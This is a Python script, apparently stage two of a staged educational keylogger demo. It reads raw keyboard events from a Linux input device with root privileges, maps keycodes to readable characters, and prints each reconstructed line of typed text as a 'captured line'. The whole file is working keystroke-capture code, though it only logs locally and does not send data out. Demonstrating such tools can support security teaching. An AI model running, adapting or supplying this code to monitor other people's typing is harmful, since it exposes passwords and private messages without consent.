#!/usr/bin/env python3
"""
STAGE 2 — Character Mapped Keylogger
=====================================
What's new vs Stage 1:
  - Keycodes are now mapped to actual readable characters
  - Only PRESS events are shown (no more duplicate release events)
  - Words are built up in real time — hacker sees what you type
  - Special keys (space, enter, backspace, tab) are shown clearly
  - Two views simultaneously:
      → RAW FEED   : every keypress as it happens
      → WORD BUILD : reconstructed text buffer (what you actually typed)

Usage:
  sudo python3 stage2_mapped.py
"""

import evdev
import sys
from datetime import datetime

KEYBOARD_DEVICE = "/dev/input/event3"

RED     = "\033[91m"
YELLOW  = "\033[93m"
GREEN   = "\033[92m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
BLUE    = "\033[94m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RESET   = "\033[0m"

# ── Keycode → Character map ──────────────────────────────────────────────────
# (normal, shifted)
KEYMAP = {
    "KEY_A": ("a", "A"), "KEY_B": ("b", "B"), "KEY_C": ("c", "C"),
    "KEY_D": ("d", "D"), "KEY_E": ("e", "E"), "KEY_F": ("f", "F"),
    "KEY_G": ("g", "G"), "KEY_H": ("h", "H"), "KEY_I": ("i", "I"),
    "KEY_J": ("j", "J"), "KEY_K": ("k", "K"), "KEY_L": ("l", "L"),
    "KEY_M": ("m", "M"), "KEY_N": ("n", "N"), "KEY_O": ("o", "O"),
    "KEY_P": ("p", "P"), "KEY_Q": ("q", "Q"), "KEY_R": ("r", "R"),
    "KEY_S": ("s", "S"), "KEY_T": ("t", "T"), "KEY_U": ("u", "U"),
    "KEY_V": ("v", "V"), "KEY_W": ("w", "W"), "KEY_X": ("x", "X"),
    "KEY_Y": ("y", "Y"), "KEY_Z": ("z", "Z"),

    "KEY_1": ("1", "!"), "KEY_2": ("2", "@"), "KEY_3": ("3", "#"),
    "KEY_4": ("4", "$"), "KEY_5": ("5", "%"), "KEY_6": ("6", "^"),
    "KEY_7": ("7", "&"), "KEY_8": ("8", "*"), "KEY_9": ("9", "("),
    "KEY_0": ("0", ")"),

    "KEY_MINUS":      ("-", "_"),
    "KEY_EQUAL":      ("=", "+"),
    "KEY_LEFTBRACE":  ("[", "{"),
    "KEY_RIGHTBRACE": ("]", "}"),
    "KEY_SEMICOLON":  (";", ":"),
    "KEY_APOSTROPHE": ("'", '"'),
    "KEY_GRAVE":      ("`", "~"),
    "KEY_BACKSLASH":  ("\\", "|"),
    "KEY_COMMA":      (",", "<"),
    "KEY_DOT":        (".", ">"),
    "KEY_SLASH":      ("/", "?"),

    "KEY_SPACE":     (" ", " "),
    "KEY_TAB":       ("\t", "\t"),
}

# Special keys that don't produce characters but are important to show
SPECIAL_KEYS = {
    "KEY_ENTER":     f"{CYAN}[ENTER]{RESET}",
    "KEY_BACKSPACE": f"{RED}[BACKSPACE]{RESET}",
    "KEY_ESC":       f"{MAGENTA}[ESC]{RESET}",
    "KEY_CAPSLOCK":  f"{YELLOW}[CAPSLOCK]{RESET}",
    "KEY_TAB":       f"{BLUE}[TAB]{RESET}",
    "KEY_UP":        f"{DIM}[↑]{RESET}",
    "KEY_DOWN":      f"{DIM}[↓]{RESET}",
    "KEY_LEFT":      f"{DIM}[←]{RESET}",
    "KEY_RIGHT":     f"{DIM}[→]{RESET}",
    "KEY_DELETE":    f"{RED}[DEL]{RESET}",
    "KEY_HOME":      f"{DIM}[HOME]{RESET}",
    "KEY_END":       f"{DIM}[END]{RESET}",
    "KEY_LEFTCTRL":  f"{MAGENTA}[CTRL]{RESET}",
    "KEY_RIGHTCTRL": f"{MAGENTA}[CTRL]{RESET}",
    "KEY_LEFTALT":   f"{MAGENTA}[ALT]{RESET}",
    "KEY_RIGHTALT":  f"{MAGENTA}[ALT]{RESET}",
    "KEY_LEFTMETA":  f"{MAGENTA}[SUPER]{RESET}",
}

BANNER = f"""
{RED}{BOLD}
 ██████╗████████╗ █████╗  ██████╗ ███████╗    ██████╗
██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝    ╚════██╗
╚█████╗    ██║   ███████║██║  ███╗█████╗        █████╔╝
 ╚═══██╗   ██║   ██╔══██║██║   ██║██╔══╝       ██╔═══╝
██████╔╝   ██║   ██║  ██║╚██████╔╝███████╗     ███████╗
╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝     ╚══════╝
{RESET}
{DIM}  STAGE 2 — Character Mapped Feed | keycodes → readable text{RESET}
{RED}  ──────────────────────────────────────────────────────────{RESET}
  {GREEN}TOP PANEL{RESET}    → live keypress feed (one line per key)
  {YELLOW}BOTTOM BAR{RESET}  → reconstructed text buffer (what you actually typed)
{RED}  ──────────────────────────────────────────────────────────{RESET}
  Listening on {BOLD}/dev/input/event3{RESET} ... {DIM}(Ctrl+C to stop){RESET}
"""

def main():
    print(BANNER)

    try:
        device = evdev.InputDevice(KEYBOARD_DEVICE)
    except PermissionError:
        print(f"{RED}[ERROR]{RESET} Run with: {BOLD}sudo python3 stage2_mapped.py{RESET}")
        sys.exit(1)

    # State tracking
    shift_held   = False
    caps_lock    = False
    text_buffer  = []
    event_count  = 0

    print(f"{BOLD}{GREEN}  ── LIVE FEED ─────────────────────────────────────────{RESET}")

    try:
        for event in device.read_loop():
            if event.type != evdev.ecodes.EV_KEY:
                continue

            key      = evdev.categorize(event)
            keyname  = key.keycode if isinstance(key.keycode, str) else key.keycode[0]
            ts       = datetime.now().strftime("%H:%M:%S.%f")[:-3]

            # ── Track shift state ──
            if keyname in ("KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"):
                shift_held = (event.value != 0)  # 1=press, 2=repeat both mean held
                continue

            # ── Track caps lock ──
            if keyname == "KEY_CAPSLOCK" and event.value == 1:
                caps_lock = not caps_lock
                print(f"  {DIM}[{ts}]{RESET}  {YELLOW}[CAPSLOCK {'ON' if caps_lock else 'OFF'}]{RESET}")
                continue

            # Only process key presses (value=1), ignore releases (0) and repeats (2)
            if event.value != 1:
                continue

            event_count += 1

            # ── Map to character ──
            if keyname in KEYMAP:
                normal, shifted = KEYMAP[keyname]
                effective_shift = shift_held ^ caps_lock  # XOR: caps inverts shift for letters
                char = shifted if effective_shift else normal

                # Add to buffer
                text_buffer.append(char)

                # Print the live feed line
                display_char = char.replace(" ", "·").replace("\t", "→")
                print(
                    f"  {DIM}[{ts}]{RESET}  "
                    f"{GREEN}▶{RESET} "
                    f"{BOLD}{YELLOW}{keyname:<20}{RESET}  "
                    f"→  {BOLD}{GREEN}{display_char}{RESET}"
                    f"{'  ' + YELLOW + '[SHIFT]' + RESET if shift_held else ''}"
                )

            elif keyname in SPECIAL_KEYS:
                label = SPECIAL_KEYS[keyname]
                print(f"  {DIM}[{ts}]{RESET}  {GREEN}▶{RESET} {BOLD}{keyname:<20}{RESET}  →  {label}")

                # Handle backspace in buffer
                if keyname == "KEY_BACKSPACE" and text_buffer:
                    text_buffer.pop()

                # On enter: print the captured line and reset buffer
                if keyname == "KEY_ENTER":
                    captured = "".join(text_buffer)
                    print(f"\n{RED}  ╔══ CAPTURED LINE {'═' * 40}{RESET}")
                    print(f"{RED}  ║{RESET}  {BOLD}{YELLOW}{captured}{RESET}")
                    print(f"{RED}  ╚══════════════════════════════════════════════{RESET}\n")
                    text_buffer = []

            else:
                # Unknown key — show raw
                print(f"  {DIM}[{ts}]{RESET}  {GREEN}▶{RESET} {DIM}{keyname:<20}  → [unmapped]{RESET}")

            # ── Always show live buffer at bottom ──
            buffer_display = "".join(text_buffer).replace("\t", "→")
            print(
                f"  {DIM}└─ buffer:{RESET} {BOLD}{CYAN}{buffer_display}{RESET}{CYAN}█{RESET}",
                end="\r"
            )
            # Move cursor up 1 to keep buffer on same line next iteration
            # (the feed lines push it down naturally)

    except KeyboardInterrupt:
        captured = "".join(text_buffer)
        print(f"\n\n{RED}  ──────────────────────────────────────────{RESET}")
        print(f"  {BOLD}Session ended.{RESET} {event_count} keypresses captured.")
        if captured:
            print(f"  {BOLD}Unsent buffer:{RESET} {YELLOW}{captured}{RESET}")
        print(f"{RED}  ──────────────────────────────────────────{RESET}\n")


if __name__ == "__main__":
    main()
